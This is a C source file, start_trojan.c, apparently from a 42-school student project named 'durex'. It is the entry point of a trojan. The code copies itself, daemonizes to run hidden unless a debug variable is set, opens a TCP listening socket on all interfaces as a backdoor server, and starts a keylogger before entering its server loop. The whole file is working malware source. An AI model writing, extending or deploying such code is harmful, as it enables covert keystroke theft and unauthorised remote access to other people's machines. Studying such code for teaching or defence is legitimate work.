/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   start_trojan.c                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/17 17:42:16 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 21:38:05 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include <sys/socket.h>
#include <netdb.h>

extern char **environ;

static void		init_srv(t_durex *durex)
{
	unsigned int		i;

	durex->serv.max_fd = 40;
	durex->clients = (t_client *)ft_memalloc(sizeof(t_client) *
			(durex->serv.max_fd + 1));
	if (!durex->clients)
		exit(1);
	i = 0;
	while (i < durex->serv.max_fd)
	{
		durex->clients[i].type = FD_FREE;
		i++;
	}
}

static void		create_srv(t_durex *durex)
{
	int						s;
	struct sockaddr_in		sin;
	struct protoent			*pe;
	int						enable;

	enable = 1;
	if (!(pe = (struct protoent *)getprotobyname("tcp")))
		log_error(durex, "Getting tcp protocol\n");
	if ((s = socket(PF_INET, SOCK_STREAM, pe->p_proto)) == -1)
		log_error(durex, "Getting socket\n");
	if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int)) < 0)
		log_error(durex, "Setsockopt(SO_REUSEADDR) failed");
	durex->serv.socket = s;
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = INADDR_ANY;
	sin.sin_port = htons(DUREX_PORT);
	if (bind(s, (struct sockaddr *)&sin, sizeof(sin)) == -1)
	{
		sleep(1);
		if (bind(s, (struct sockaddr *)&sin, sizeof(sin)) == -1)
			log_error(durex, "Port taken\n");
	}
	if (listen(s, 10) == -1)
		log_error(durex, "Listen failed\n");
	durex->clients[s].type = FD_SRV;
}

void			init_durex(t_durex *durex, char *path)
{
    durex->debug = getenv("DUREX_DEBUG") == NULL ? 0 : 1;
	durex->env = environ;
	durex->path = path;
	durex->log = -1;
}

void			start_trojan(char *path)
{
	t_durex			durex;

	ft_bzero(&durex, sizeof(t_durex));
	init_durex(&durex, path);
	open_logs(&durex);
	save_trojan(&durex.trojan, path);
	if (!durex.debug)
		daemonize(&durex);
	init_srv(&durex);
	create_srv(&durex);
	keylog(&durex, -1);
    server_loop(&durex);
}
